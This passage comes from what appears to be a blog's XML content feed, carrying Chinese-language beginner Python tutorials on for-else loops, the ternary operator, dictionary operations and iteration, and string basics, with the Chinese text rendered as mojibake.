elseè¯­å¥ã€‚æ‰€ä»¥ä¸ç†Ÿæ‚‰æ­¤è¯­æ³•çš„äººå¯èƒ½ä¼šè¯¯è®¤ä¸ºï¼šå¦‚æœå¾ªç¯æ²¡æœ‰æ­£å¸¸æ‰§è¡Œå®Œï¼Œé‚£å°±æ‰§è¡Œelse å—ã€‚ä½†å®é™…ä¸Šæ­£å¥½ç›¸åï¼Œå¾ªç¯æ­£å¸¸æ‰§è¡Œå®Œä¼šç«‹å³æ‰§è¡Œ elseä»£ç å—ï¼›åœ¨å¾ªç¯é‡Œç”¨ break è·³å‡º(å³ä½¿æ˜¯æœ€åä¸€ä¸ªå¾ªç¯break)ï¼Œä¼šå¯¼è‡´ç¨‹åºä¸æ‰§è¡Œ elseã€‚</p><p><strong>å› æ­¤ï¼Œå¾ªç¯åé¢çš„ elseä»£ç å—æ²¡æœ‰å¿…è¦ä¸”å®¹æ˜“å¼•èµ·æ­§ä¹‰ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚</strong></p><h2 id="åº”ç”¨åœºæ™¯-2"><del>åº”ç”¨åœºæ™¯</del></h2><ul><li>åœ¨ <strong>è¿­ä»£éå†</strong> åµŒå¥—çš„æ•°æ®ç±»å‹æ—¶ï¼Œä¾‹å¦‚<strong>ä¸€ä¸ªåˆ—è¡¨åŒ…å«äº†å¤šä¸ªå­—å…¸</strong></li><li>éœ€æ±‚ï¼šè¦åˆ¤æ–­ æŸä¸€ä¸ªå­—å…¸ä¸­ æ˜¯å¦å­˜åœ¨ æŒ‡å®šçš„ å€¼<ul><li>å¦‚æœ <strong>å­˜åœ¨</strong>ï¼Œæç¤ºå¹¶ä¸”é€€å‡ºå¾ªç¯</li><li>å¦‚æœ <strong>ä¸å­˜åœ¨</strong>ï¼Œåœ¨ <strong>å¾ªç¯æ•´ä½“ç»“æŸ</strong>åï¼Œå¸Œæœ› <strong>å¾—åˆ°ä¸€ä¸ªç»Ÿä¸€çš„æç¤º</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">students = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;é˜¿åœŸ&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span>: <span class="number">20</span>,</span><br><span class="line">     <span class="string">&quot;gender&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">     <span class="string">&quot;height&quot;</span>: <span class="number">1.7</span>,</span><br><span class="line">     <span class="string">&quot;weight&quot;</span>: <span class="number">75.0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;å°ç¾&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span>: <span class="number">19</span>,</span><br><span class="line">     <span class="string">&quot;gender&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">     <span class="string">&quot;height&quot;</span>: <span class="number">1.6</span>,</span><br><span class="line">     <span class="string">&quot;weight&quot;</span>: <span class="number">45.0</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">find_name = <span class="string">&quot;é˜¿åœŸ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stu_dict <span class="keyword">in</span> students:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stu_dict)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ¤æ–­å½“å‰éå†çš„å­—å…¸ä¸­å§“åæ˜¯å¦ä¸ºfind_name</span></span><br><span class="line">    <span class="keyword">if</span> stu_dict[<span class="string">&quot;name&quot;</span>] == find_name:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ‰¾åˆ°äº†&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœå·²ç»æ‰¾åˆ°ï¼Œç›´æ¥é€€å‡ºå¾ªç¯ï¼Œå°±ä¸éœ€è¦å†å¯¹åç»­çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ²¡æœ‰æ‰¾åˆ°&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å¾ªç¯ç»“æŸ&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="è¡¥å……">è¡¥å……</h1><p>Python ä¸­ä¸‰å…ƒè¿ç®—ç¬¦çš„å†™æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: a=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: b=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="number">3</span> <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> <span class="number">5</span>        <span class="comment">#  å¦‚æœ a &gt; b, è¿”å› 3ï¼Œå¦åˆ™è¿”å› 5</span></span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: c= <span class="number">3</span> <span class="keyword">if</span> a&gt;b <span class="keyword">else</span> <span class="number">5</span>     <span class="comment"># å¦‚æœ a&gt;b, åˆ™ c=3ï¼Œ å¦åˆ™ c= 5</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: c</span><br><span class="line">Out[<span class="number">12</span>]: <span class="number">5</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python å­—å…¸</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.dict/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.dict/</url>
      
        <content type="html"><![CDATA[<h2 id="å®šä¹‰">å®šä¹‰</h2><p><code>dictionary</code> ï¼ˆå­—å…¸ï¼‰ æ˜¯ <strong>é™¤åˆ—è¡¨ä»¥å¤–</strong><code>Python</code> ä¹‹ä¸­ <strong>æœ€çµæ´»</strong> çš„æ•°æ®ç±»å‹,å­—å…¸é€šå¸¸ç”¨äºå­˜å‚¨ <strong>æè¿°ä¸€ä¸ª <code>ç‰©ä½“</code>çš„ç›¸å…³ä¿¡æ¯</strong></p><p>å­—å…¸å’Œåˆ—è¡¨çš„åŒºåˆ«</p><pre><code>- **åˆ—è¡¨** æ˜¯ **æœ‰åº** çš„å¯¹è±¡é›†åˆ- **å­—å…¸** æ˜¯ **æ— åº** çš„å¯¹è±¡é›†åˆ</code></pre><ul><li><p>å­—å…¸ç”¨ <code>&#123;&#125;</code> å®šä¹‰</p></li><li><p>å­—å…¸ä½¿ç”¨ <strong>é”®å€¼å¯¹</strong> å­˜å‚¨æ•°æ®ï¼Œé”®å€¼å¯¹ä¹‹é—´ä½¿ç”¨<code>,</code> åˆ†éš”</p><ul><li><strong>é”®</strong> <code>key</code> æ˜¯ç´¢å¼•</li><li><strong>å€¼</strong> <code>value</code> æ˜¯æ•°æ®</li><li><strong>é”®</strong> å’Œ <strong>å€¼</strong> ä¹‹é—´ä½¿ç”¨ <code>:</code>åˆ†éš”</li><li><strong>é”®å¿…é¡»æ˜¯å”¯ä¸€çš„</strong></li><li><strong>å€¼</strong> å¯ä»¥å–ä»»ä½•æ•°æ®ç±»å‹ï¼Œä½† <strong>é”®</strong>åªèƒ½ä½¿ç”¨ <strong>å­—ç¬¦ä¸²</strong>ã€<strong>æ•°å­—</strong>æˆ–<strong>å…ƒç»„</strong>, å› ä¸ºå­—å…¸çš„å€¼è¦æ±‚æ˜¯å¯ hashçš„ï¼Œå› æ­¤éœ€è¦æ˜¯ä¸å¯å˜ç±»å‹ã€‚</li></ul></li></ul><p>æ³¨æ„:åˆå§‹åŒ–å­—å…¸çš„é”®å€¼æ—¶ï¼Œä¸€èˆ¬æ¯è¡Œä¸€ä¸ªé”®å€¼å¯¹(å¦‚ä¸‹é¢ä¾‹å­æ ¼å¼)ï¼Œè¿™æ ·æ›´åŠ æ¸…æ™°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xiaoming = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;å°æ˜&quot;</span>,</span><br><span class="line">            <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">            <span class="string">&quot;gender&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;height&quot;</span>: <span class="number">1.75</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨æ“ä½œ">å¸¸ç”¨æ“ä½œ</h2><ul><li>åœ¨ <code>ipython3</code> ä¸­å®šä¹‰ä¸€ä¸ª <strong>å­—å…¸</strong>ï¼Œä¾‹å¦‚ï¼š<code>xiaoming = &#123;&#125;</code></li><li>è¾“å…¥ <code>xiaoming.</code> æŒ‰ä¸‹ <code>TAB</code> é”®ï¼Œ<code>ipython</code> ä¼šæç¤º <strong>å­—å…¸</strong>èƒ½å¤Ÿä½¿ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: xiaoming.</span><br><span class="line">xiaoming.clear       xiaoming.items       xiaoming.setdefault</span><br><span class="line">xiaoming.copy        xiaoming.keys        xiaoming.update</span><br><span class="line">xiaoming.fromkeys    xiaoming.pop         xiaoming.values</span><br><span class="line">xiaoming.get         xiaoming.popitem</span><br></pre></td></tr></table></figure><p><code>len(dict)</code> è·å–å­—å…¸é”®å€¼å¯¹æ•°é‡ <code>dict.keys()</code>æ‰€æœ‰ key çš„åˆ—è¡¨ <code>dict.values()</code> æ‰€æœ‰ values åˆ—è¡¨<code>dict.items()</code> æ‰€æœ‰ (key, values) å…ƒç»„åˆ—è¡¨<code>dict.update(temp_dict)</code> åˆå¹¶å­—å…¸æ³¨æ„ï¼šå¦‚æœè¢«åˆå¹¶çš„å­—å…¸ä¸­åŒ…å«å·²å­˜åœ¨çš„é”®ï¼Œåˆ™æ–°åˆå¹¶æ¥çš„å€¼ä¼šè¦†ç›–åŸå€¼ã€‚<code>dict.clear()</code> æ¸…ç©ºå­—å…¸</p><h2 id="å¢åˆ æ”¹æŸ¥">å¢åˆ æ”¹æŸ¥</h2><ol type="1"><li><p>æŸ¥è¯¢ï¼Œç›´æ¥æŸ¥è¯¢ <code>dict[keyå€¼]</code> å³å¯</p><p>åˆ¤æ–­ key æ˜¯å¦å­˜åœ¨:</p><ol type="1"><li><code>dict[keyå€¼]</code>, key ä¸å­˜åœ¨ï¼Œä¼šæŠ›å‡º <code>KeyError</code>é”™è¯¯ã€‚</li><li><code>dict.get(keyå€¼)</code>ï¼Œkey ä¸å­˜åœ¨ã€‚get å‡½æ•°è¿”å›ç©ºNoneï¼Œä½†ä¸ä¼šå‡ºé”™ã€‚</li></ol><p>æ³¨ï¼šæŸ¥æ‰¾ value ï¼Œ ä½¿ç”¨ <code>dict["name"] == "zhangsan"</code>è·å–æ¯”è¾ƒå³å¯ã€‚</p></li></ol><ul><li><p>å¢åŠ /åˆ é™¤ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œ ä¼šæ–°å¢é”®å€¼å¯¹ï¼Œå¦‚æœ keyå­˜åœ¨ï¼Œä¼šä¿®æ”¹å·²ç»å­˜åœ¨çš„é”®å€¼å¯¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perinfo = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">perinfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(perinfo[<span class="string">&quot;age&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ï¼Œä½¿ç”¨ <code>pop(keyå€¼)</code> åˆ é™¤</p></li><li><p>å¢åŠ ï¼Œç›´æ¥å†™è¦å¢åŠ çš„ key ï¼Œvalues å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perinfo = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">perinfo[<span class="string">&quot;age&quot;</span>] = <span class="number">18</span></span><br><span class="line">perinfo.pop(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(perinfo)</span><br></pre></td></tr></table></figure><p>æ³¨æ„: å¦‚æœè¦åˆ é™¤çš„ key å€¼ä¸å­˜åœ¨ï¼Œä¹Ÿä¼šæŠ¥ KeyError é”™è¯¯</p></li></ul><h2 id="å¾ªç¯éå†">å¾ªç¯éå†</h2><ul><li><strong>éå†</strong> å°±æ˜¯ <strong>ä¾æ¬¡</strong> ä»<strong>å­—å…¸</strong> ä¸­è·å–æ‰€æœ‰é”®å€¼å¯¹</li></ul><p>ä¸‰ç§éœ€æ±‚ï¼š</p><ol type="1"><li><p>ä»å­—å…¸ä¸­éå†é”®</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">19</span>]: dic</span><br><span class="line">Out[<span class="number">19</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Jon&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    ...:     <span class="built_in">print</span>(i)</span><br><span class="line">    ...:</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line">gender</span><br></pre></td></tr></table></figure></p></li><li><p>ä»å­—å…¸ä¸­éå†å€¼</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³• <span class="number">1</span>ï¼šæ¨è</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: <span class="keyword">for</span> value <span class="keyword">in</span> dic.values():</span><br><span class="line">   ...:     <span class="built_in">print</span>(value)</span><br><span class="line">   ...:</span><br><span class="line">Jon</span><br><span class="line"><span class="number">16</span></span><br><span class="line">male</span><br><span class="line"></span><br><span class="line">æ–¹æ³• <span class="number">2</span>ï¼š</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">   ...:     <span class="built_in">print</span>(dic[i])</span><br><span class="line">Jon</span><br><span class="line"><span class="number">16</span></span><br><span class="line">male</span><br></pre></td></tr></table></figure></p></li><li><p>ä»å­—å…¸ä¸­éå†é”®å€¼å¯¹</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³• <span class="number">1</span>ï¼š æ¨è</span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: <span class="keyword">for</span> item <span class="keyword">in</span> dic.items():</span><br><span class="line">    ...:     <span class="built_in">print</span>(item)</span><br><span class="line">    ...:(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Jon&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;age&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">(<span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;male&#x27;</span>)</span><br><span class="line"></span><br><span class="line">æ–¹æ³• <span class="number">2</span>ï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment"># for å¾ªç¯å†…éƒ¨ä½¿ç”¨çš„ `key çš„å˜é‡` in å­—å…¸</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xiaoming:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s: %s&quot;</span> % (k, xiaoming[k]))</span><br></pre></td></tr></table></figure></p></li></ol><blockquote><p>æç¤ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œç”±äºå­—å…¸ä¸­æ¯ä¸€ä¸ªé”®å€¼å¯¹ä¿å­˜æ•°æ®çš„ç±»å‹æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥é’ˆå¯¹å­—å…¸çš„å¾ªç¯éå†éœ€æ±‚å¹¶ä¸æ˜¯å¾ˆå¤š</p></blockquote><h2 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h2><ul><li>å°½ç®¡å¯ä»¥ä½¿ç”¨ <code>for in</code> éå† <strong>å­—å…¸</strong></li><li>ä½†æ˜¯åœ¨å¼€å‘ä¸­ï¼Œæ›´å¤šçš„åº”ç”¨åœºæ™¯æ˜¯ï¼š<ul><li>ä½¿ç”¨ <strong>å¤šä¸ªé”®å€¼å¯¹</strong>ï¼Œå­˜å‚¨ <strong>æè¿°ä¸€ä¸ª<code>ç‰©ä½“</code> çš„ç›¸å…³ä¿¡æ¯</strong> â€”â€” æè¿°æ›´å¤æ‚çš„æ•°æ®ä¿¡æ¯</li><li>å°† <strong>å¤šä¸ªå­—å…¸</strong> æ”¾åœ¨ <strong>ä¸€ä¸ªåˆ—è¡¨</strong>ä¸­ï¼Œå†è¿›è¡Œéå†ï¼Œåœ¨å¾ªç¯ä½“å†…éƒ¨é’ˆå¯¹æ¯ä¸€ä¸ªå­—å…¸è¿›è¡Œ<strong>ç›¸åŒçš„å¤„ç†</strong></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">card_list = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;å¼ ä¸‰&quot;</span>,</span><br><span class="line">              <span class="string">&quot;qq&quot;</span>: <span class="string">&quot;12345&quot;</span>,</span><br><span class="line">              <span class="string">&quot;phone&quot;</span>: <span class="string">&quot;110&quot;</span>&#125;,</span><br><span class="line">             &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;æå››&quot;</span>,</span><br><span class="line">              <span class="string">&quot;qq&quot;</span>: <span class="string">&quot;54321&quot;</span>,</span><br><span class="line">              <span class="string">&quot;phone&quot;</span>: <span class="string">&quot;10086&quot;</span>&#125;</span><br><span class="line">             ]</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§ç®—æ³•">å¸¸è§ç®—æ³•</h2><h3 id="æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹">æŸ¥æ‰¾ä¸¤å­—å…¸çš„ç›¸åŒç‚¹</h3><p>å¦‚ä½•åœ¨ä¸¤ä¸ªå­—å…¸ä¸­å¯»æ‰¾ç›¸åŒç‚¹ï¼ˆæ¯”å¦‚: ç›¸åŒçš„é”®ã€ç›¸åŒçš„å€¼ç­‰ï¼‰ï¼Ÿ</p><p>çŸ¥è¯†ç‚¹: <code>dict_keys</code>, <code>dict_items</code>æ”¯æŒåŸºæœ¬çš„é›†åˆæ“ä½œï¼Œ å¹¶é›† <code>|</code>ï¼Œ äº¤é›† <code>&amp;</code>ï¼Œå·®é›† <code>-</code>ï¼Œ å¯¹ç§°å·®é›† <code>^</code>ã€‚ æ³¨ï¼š<code>dict_values</code>ä¸æ”¯æŒé›†åˆè¿ç®—ï¼Œæ˜¯å› ä¸ºå­—å…¸çš„å€¼å¯é‡å¤ï¼Œä¸ä¸€å®šæ˜¯å”¯ä¸€çš„ï¼Œè¿™æ ·ä¼šå¯¼è‡´æŸäº›é›†åˆçš„æ“ä½œå‡ºç°é—®é¢˜ã€‚ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.keys() &amp; b.keys()</span><br><span class="line">a.keys() | b.keys()</span><br><span class="line">a.keys() - b.keys()</span><br><span class="line">a.items() ^ b.items()</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹æˆ–è€…è¿‡æ»¤å­—å…¸å…ƒç´ ">ä¿®æ”¹æˆ–è€…è¿‡æ»¤å­—å…¸å…ƒç´ </h2><p>ä»¥ç°æœ‰å­—å…¸æ„é€ ä¸€ä¸ªæ’é™¤å‡ ä¸ªæŒ‡å®šé”®çš„æ–°å­—å…¸ã€‚ä¸‹é¢åˆ©ç”¨å­—å…¸æ¨å¯¼æ¥å®ç°è¿™æ ·çš„éœ€æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## make a new dict with certain keys removed</span></span><br><span class="line">c = &#123;key:a[key] <span class="keyword">for</span> key <span class="keyword">in</span> a.keys() - &#123;<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;name&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python å­—ç¬¦ä¸²</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.string/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.string/</url>
      
        <content type="html"><![CDATA[<h2 id="å­—ç¬¦ä¸²çš„å®šä¹‰">å­—ç¬¦ä¸²çš„å®šä¹‰</h2><ul><li><strong>å­—ç¬¦ä¸²</strong> æ˜¯ <strong>ä¸€ä¸²å­—ç¬¦</strong>ï¼Œä¹Ÿæ˜¯<code>collection of character</code> ,å› æ­¤ï¼Œå’Œåˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸æœ‰è®¸å¤šç›¸åŒçš„æ–¹æ³•ç‰¹æ€§ã€‚</li><li>åœ¨ Python ä¸­å¯ä»¥ä½¿ç”¨ <strong>ä¸€å¯¹åŒå¼•å·</strong> <code>"</code> æˆ–è€…<strong>ä¸€å¯¹å•å¼•å·</strong> <code>'</code> å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²<ul><li>è™½ç„¶å¯ä»¥ä½¿ç”¨ <code>\"</code> æˆ–è€… <code>\'</code>åšå­—ç¬¦ä¸²çš„è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨å®é™…å¼€å‘ä¸­ï¼š<ul><li>å¦‚æœå­—ç¬¦ä¸²å†…éƒ¨éœ€è¦ä½¿ç”¨ <code>"</code> ï¼Œå¯ä»¥ä½¿ç”¨ <code>'</code>å®šä¹‰å­—ç¬¦ä¸²</li><li>å¦‚æœå­—ç¬¦ä¸²å†…éƒ¨éœ€è¦ä½¿ç”¨ <code>'</code> ï¼Œå¯ä»¥ä½¿ç”¨ <code>"</code>å®šä¹‰å­—ç¬¦ä¸²</li></ul></li></ul></li><li>å¯ä»¥ä½¿ç”¨ <strong>ç´¢å¼•</strong> è·å–ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­<strong>æŒ‡å®šä½ç½®çš„å­—ç¬¦</strong>ï¼Œç´¢å¼•è®¡æ•°ä» <strong>0</strong> å¼€å§‹</li><li>ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>for</code> <strong>å¾ªç¯éå†</strong>å­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦</li></ul><blockquote><p>å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€éƒ½æ˜¯ç”¨ <code>"</code> æ¥å®šä¹‰å­—ç¬¦ä¸²</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;Hello Python&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²çš„å¸¸ç”¨æ“ä½œ">å­—ç¬¦ä¸²çš„å¸¸ç”¨æ“ä½œ</h2><ul><li>åœ¨ <code>ipython3</code> ä¸­å®šä¹‰ä¸€ä¸ª <strong>å­—ç¬¦ä¸²</strong>ï¼Œä¾‹å¦‚ï¼š<code>hello_str = ""</code></li><li>è¾“å…¥ <code>hello_str.</code> æŒ‰ä¸‹ <code>TAB</code> é”®ï¼Œ<code>ipython</code> ä¼šæç¤º <strong>å­—ç¬¦ä¸²</strong> èƒ½å¤Ÿä½¿ç”¨çš„<strong>æ–¹æ³•</strong> å¦‚ä¸‹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [1]: hello_str.</span><br><span class="line">hello_str.capitalize    hello_str.isidentifier  hello_str.rindex</span><br><span class="line">hello_str.casefold      hello_str.islower       hello_str.rjust</span><br><span class="line">hello_str.center        hello_str.isnumeric     hello_str.rpartition</span><br><span class="line">hello_str.count         hello_str.isprintable   hello_str.rsplit</span><br><span class="line">hello_str.encode        hello_str.isspace       hello_str.rstrip</span><br><span class="line">hello_str.endswith      hello_str.istitle       hello_str.split</span><br><span class="line">hello_str.expandtabs    hello_str.isupper       hello_str.splitlines</span><br><span class="line">hello_str.find          hello_str.join          hello_str.startswith</span><br><span class="line">hello_str.format        hello_str.ljust         hello_str.strip</span><br><span class="line">hello_str.format_map    hello_str.lower         hello_str.swapcase</span><br><span class="line">hello_str.index         hello_str.lstrip        hello_str.title</span><br><span class="line">hello_str.isalnum       hello_str.maketrans     hello_str.translate</span><br><span class="line">hello_str.isalpha       hello_str.partition     hello_str.upper</span><br><span class="line">hello_str.isdecimal     hello_str.replace       hello_str.zfill</span><br><span class="line">hello_str.isdigit       hello_str.rfind</span><br></pre></td></tr></table></figure><blockquote><p>æç¤ºï¼šæ­£æ˜¯å› ä¸º pythonå†…ç½®æä¾›çš„æ–¹æ³•è¶³å¤Ÿå¤šï¼Œæ‰ä½¿å¾—åœ¨å¼€å‘æ—¶ï¼Œèƒ½å¤Ÿé’ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œæ›´åŠ çµæ´»çš„æ“ä½œï¼åº”å¯¹æ›´å¤šçš„å¼€å‘éœ€æ±‚ï¼</p></blockquote><h3 id="å­—ç¬¦ä¸²æ‹¼æ¥">0) å­—ç¬¦ä¸²æ‹¼æ¥</h3><p>python ä¸­è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæå…¶ç®€å•ã€‚ ä½¿ç”¨ <code>+</code>è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: test = <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;world&quot;</span></span><br><span class="line">In [<span class="number">6</span>]: 